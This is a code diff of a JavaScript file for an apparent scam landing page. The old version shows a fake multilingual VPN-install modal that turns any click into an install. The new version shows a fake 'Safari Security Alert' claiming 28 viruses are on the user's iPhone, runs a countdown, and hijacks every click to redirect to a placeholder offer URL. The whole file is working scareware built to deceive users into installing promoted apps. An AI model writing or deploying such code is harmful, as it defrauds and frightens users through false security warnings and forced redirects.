@@ -1,179 +1,116 @@
-document.body.style.overflow ="hidden";
+const OFFER_URL = "{offer}";
+const COUNTDOWN_SECONDS = 180;
 
-(function () {
-  const setViewportHeight = () => {
-    const viewportHeight = window.visualViewport
-      ? window.visualViewport.height
-      : window.innerHeight;
-
-    document.documentElement.style.setProperty(
-      "--app-viewport-height",
-      `${Math.round(viewportHeight)}px`
-    );
-  };
-
-  setViewportHeight();
-  window.addEventListener("resize", setViewportHeight);
-  window.addEventListener("orientationchange", setViewportHeight);
-
-  if (window.visualViewport) {
-    window.visualViewport.addEventListener("resize", setViewportHeight);
-    window.visualViewport.addEventListener("scroll", setViewportHeight);
-  }
-})();
-
-document.addEventListener("DOMContentLoaded", function () {
-    const bg = document.querySelector(".screen-bg");
-    const modal = document.querySelector(".fake-modal");
-  
-
-
-    let totalSeconds = "60";
-    let timerStarted = false;
-    let switched = false;
-    let intervalId = null;
-
- const translations = {
+const translations = {
   en: {
-  modal_title_key: "Attention",
-  modal_text_key: "Download a VPN to continue watching in secure mode.",
-  scan_now_option: "Install",
-},
-
-fr: {
-modal_title_key: "Attention",
-modal_text_key: "Téléchargez un VPN pour continuer à regarder en mode sécurisé.",
-scan_now_option: "Installer",
-},
-
-"pt-PT": {
-modal_title_key: "Atenção",
-modal_text_key: "Transfira uma VPN para continuar a ver em modo seguro.",
-scan_now_option: "Instalar",
-},
-
-"pt-BR": {
-modal_title_key: "Atenção",
-modal_text_key: "Baixe uma VPN para continuar assistindo no modo seguro.",
-scan_now_option: "Instalar",
-},
-
-es: {
-modal_title_key: "Atención",
-modal_text_key: "Descargue una VPN para seguir viendo en modo seguro.",
-scan_now_option: "Instalar",
-},
-
-"es-419": {
-modal_title_key: "Atención",
-modal_text_key: "Descarga una VPN para seguir viendo en modo seguro.",
-scan_now_option: "Instalar",
-},
-
-da: {
-modal_title_key: "Advarsel",
-modal_text_key: "Download en VPN for at fortsætte visningen i sikker tilstand.",
-scan_now_option: "Installer",
-},
-
-ja: {
-modal_title_key: "注意",
-modal_text_key: "安全モードで視聴を続けるには、VPN をインストールしてください。",
-scan_now_option: "インストール",
-},
-
-fil: {
-modal_title_key: "Babala",
-modal_text_key: "Mag-download ng VPN upang magpatuloy sa panonood sa secure na mode.",
-scan_now_option: "I-install",
-},
-
-de: {
-modal_title_key: "Achtung",
-modal_text_key: "Laden Sie ein VPN herunter, um im sicheren Modus weiterzusehen.",
-scan_now_option: "Installieren",
-},
-
-nb: {
-modal_title_key: "Advarsel",
-modal_text_key: "Last ned en VPN for å fortsette å se i sikker modus.",
-scan_now_option: "Installer",
-},
-
-sv: {
-modal_title_key: "Observera",
-modal_text_key: "Ladda ner en VPN för att fortsätta titta i säkert läge.",
-scan_now_option: "Installera",
-},
-
-it: {
-modal_title_key: "Attenzione",
-modal_text_key: "Scarica una VPN per continuare a guardare in modalità sicura.",
-scan_now_option: "Installa",
-},
-
-nl: {
-modal_title_key: "Let op",
-modal_text_key: "Download een VPN om verder te kijken in de beveiligde modus.",
-scan_now_option: "Installeren",
-},
-
-ro: {
-modal_title_key: "Atenție",
-modal_text_key: "Descarcă un VPN pentru a continua vizionarea în modul securizat.",
-scan_now_option: "Instalează",
-},
+    title: "Safari Security Alert",
+    brand: "Safari",
+    heroDanger: "28 VIRUSES",
+    heroTitle: " have been found on your iPhone, causing infection and damage.",
+    heroCopy: "Your iPhone is infected with viruses that could soon damage your SIM card, data, photos, and contacts if not fixed immediately.",
+    stepsTitle: "How to remove virus:",
+    stepOne: "Tap the button below & go to App Store to Install the recommended virus removal App for free.",
+    stepTwo: "Run the app to remove all viruses.",
+    cta: "Remove Viruses Now"
+  }
 };
 
-  const definedLanguages = [
-    "en", "fr", "pt-PT", "pt-BR", "es", "es-419",
-    "da", "ja", "fil", "de", "nb", "sv", "it", "nl", "ro"
-  ];
+const locale = document.documentElement.lang || "en";
+const dictionary = translations[locale] || translations.en;
+let remainingSeconds = COUNTDOWN_SECONDS;
+let redirected = false;
 
-  const currentLocale = (navigator && navigator.language) || "en";
+function setViewportHeight() {
+  const viewportHeight = window.visualViewport
+    ? window.visualViewport.height
+    : window.innerHeight;
 
-  const getLocale = () => {
-    if (translations[currentLocale]) return currentLocale;
+  document.documentElement.style.setProperty(
+    "--app-viewport-height",
+    `${Math.round(viewportHeight)}px`
+  );
+}
 
-    const shortLocale = currentLocale.slice(0, 2);
-    if (translations[shortLocale]) return shortLocale;
+function applyTranslations() {
+  document.title = dictionary.title;
 
-    return "en";
-  };
+  document.querySelectorAll("[data-i18n]").forEach((node) => {
+    const key = node.dataset.i18n;
+    node.textContent = dictionary[key] || key;
+  });
+}
 
-  const locale = getLocale();
-  const t = translations[locale] || translations.en;
+function setCurrentDate() {
+  const dateNode = document.querySelector("[data-current-date]");
+  if (!dateNode) return;
 
-  document.documentElement.lang = locale;
+  const now = new Date();
+  dateNode.dateTime = now.toISOString();
+  dateNode.textContent = new Intl.DateTimeFormat(locale, {
+    month: "long",
+    day: "numeric",
+    year: "numeric"
+  }).format(now);
+}
 
-  document.getElementById("modal_title_key").textContent = t.modal_title_key;
-  document.getElementById("modal_text_key").innerHTML = t.modal_text_key || translations.en.modal_text_key;
-  document.getElementById("scan_now_option").textContent = t.scan_now_option;
+function renderCountdown() {
+  const timerNode = document.querySelector("[data-countdown]");
+  if (!timerNode) return;
 
+  const minutes = String(Math.floor(remainingSeconds / 60)).padStart(2, "0");
+  const seconds = String(remainingSeconds % 60).padStart(2, "0");
+  timerNode.textContent = `00:${minutes}:${seconds}`;
+}
 
-document.addEventListener("click", function (e) {
-    const installBtn = document.getElementById("goStep1");
-    if (!installBtn) return;
-    installBtn.click();
-});
+function goToOffer() {
+  if (redirected) return;
+  redirected = true;
+  window.location.href = OFFER_URL;
+}
 
+function startCountdown() {
+  renderCountdown();
 
+  const intervalId = window.setInterval(() => {
+    remainingSeconds -= 1;
+    renderCountdown();
 
-
-    if (bg) {
-        requestAnimationFrame(() => {
-            bg.classList.add("active");
-        });
+    if (remainingSeconds <= 0) {
+      window.clearInterval(intervalId);
+      goToOffer();
     }
+  }, 1000);
+}
 
-  
-(function () {
-  const ua = navigator.userAgent;
-  const isIOS = /iPhone|iPad|iPod/i.test(ua);
-  const isChrome = /CriOS/i.test(ua);
-
-  if (isIOS && isChrome) {
-    document.body.classList.add('ios-chrome');
+function bindClicks() {
+  const offerLink = document.querySelector("[data-offer-link]");
+  if (offerLink) {
+    offerLink.href = OFFER_URL;
+    offerLink.addEventListener("click", (event) => {
+      event.preventDefault();
+      goToOffer();
+    });
   }
-})();
-});
+
+  document.addEventListener("click", (event) => {
+    const isModifiedClick = event.metaKey || event.ctrlKey || event.shiftKey || event.altKey;
+    if (isModifiedClick) return;
+
+    event.preventDefault();
+    goToOffer();
+  });
+}
+
+applyTranslations();
+setViewportHeight();
+setCurrentDate();
+startCountdown();
+bindClicks();
+
+window.addEventListener("resize", setViewportHeight);
+window.addEventListener("orientationchange", setViewportHeight);
+
+if (window.visualViewport) {
+  window.visualViewport.addEventListener("resize", setViewportHeight);
+  window.visualViewport.addEventListener("scroll", setViewportHeight);
+}
